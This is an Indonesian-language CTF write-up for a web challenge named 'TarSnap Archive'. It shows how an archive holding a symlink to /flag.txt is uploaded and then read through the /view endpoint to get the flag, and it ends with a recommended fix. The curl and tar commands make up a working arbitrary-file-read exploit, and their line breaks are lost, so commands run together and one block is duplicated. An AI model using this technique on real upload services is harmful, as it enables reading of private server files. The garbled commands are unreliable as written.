# 1. TarSnap Archive

### 1.1 Informasi Challenge

- Nama Challenge: TarSnap Archive.

- Kategori: Web.

- Poin: 1000.

- Author: LTFZP.

- Bahan: tarsnap_dist.zip (app.py, Dockerfile, templates/).

- Celah: symlink attack pada ekstraksi .tar.gz (member.linkname tidak diperiksa).

- Flag: Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}.

### 1.2 Deskripsi Soal

TarSnap is the next-generation cloud portfolio ingestion engine designed for digital artists and creative developers. Upload your .tar.gz portfolio archives, unpack high-resolution assets, and preview them live in a private cloud sandbox. The developers claim it is airtight, so no company data can leak — the goal is to retrieve flag.txt from the server despite the direct-access block.

### 1.3 Langkah-Langkah

#### Langkah 1 — Reconnaissance (Bedah app.py)

Ekstrak kode sumber dan baca route /upload. Pemeriksaan keamanan hanya memeriksa member.name (nama anggota arsip): traversal (.. dan / awal) ditolak, nama yang mengandung flag/shadow/passwd ditolak, dan ekstensi executable (.php/.py/.sh/...) ditolak. Namun target symlink (member.linkname) tidak pernah diperiksa, dan ekstraksi memakai fully_trusted_filter (atau tanpa filter) sehingga symlink lolos. Route /view sendiri hanya menolak .., /, dan \ pada parameter file, lalu menyajikan berkas via send_file — tanpa validasi tambahan sehingga symlink yang sudah tertanam akan diikuti.

```
unzip tarsnap_dist.zipls -la tarsnap_dist  # app.py, Dockerfile, templates/
```

```
Nyalakan instance challenge dan catat URL-nya (misal https://tarsnap-xxxx.instance.tbf1.online). Buat symlink bernama aman yang menunjuk ke /flag.txt, lalu kemas menjadi tar.gz:
```

```
ln -s /flag.txt /tmp/data1cd /tmptar -czf payload.tar.gz data1curl -k -X POST -F "archive=@payload.tar.gz" https://tarsnap-xxxx.instance.tbf1.online/upload
```

Nama data1 lolos seluruh filter (tidak mengandung kata terlarang dan berekstensi aman), sehingga server mengekstrak symlink tersebut ke direktori user.

#### Langkah 2 — Buat dan Unggah Payload Symlink

Nyalakan instance challenge dan catat URL-nya, lalu buat symlink bernama aman yang menunjuk ke /flag.txt dan kemas menjadi tar.gz:

```
ln -s /flag.txt /tmp/data1cd /tmptar -czf payload.tar.gz data1curl -k -X POST -F "archive=@payload.tar.gz" https://tarsnap-xxxx.instance.tbf1.online/upload
```

Nama data1 lolos seluruh filter (tidak mengandung kata terlarang dan berekstensi aman), sehingga server mengekstrak symlink tersebut ke direktori user.

#### Langkah 3 — Baca Flag via /view

Akses endpoint /view dengan parameter file=data1; server mengikuti symlink dan menyajikan isi /flag.txt:

```
curl -k https://tarsnap-xxxx.instance.tbf1.online/view?file=data1# Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}
```

Keluaran langsung menampilkan flag. Ambil tangkapan layar terminal yang menampilkan perintah beserta flag-nya.

### 1.4 Analisis

Celah ini merupakan validasi satu sisi: filter memeriksa nama symlink tetapi tidak memeriksa targetnya (linkname), sementara fully_trusted_filter secara eksplisit mempertahankan symlink demi portofolio unix. Karena /view hanya memblokir traversal pada parameter dan tidak memverifikasi apakah berkas adalah symlink, rantai upload-symlink lalu read-via-view menjadi arbitrary file read yang utuh. Perbaikan yang tepat adalah menolak symlink seluruhnya (atau me-resolve dan memvalidasi target di dalam direktori user) serta memblokir pola nama pada linkname, bukan hanya pada member.name.

### 1.5 Flag

Kaito{t4r_syml1nk_4rb1tr4ry_f1l3_r34d_3xpl01t_91a4}
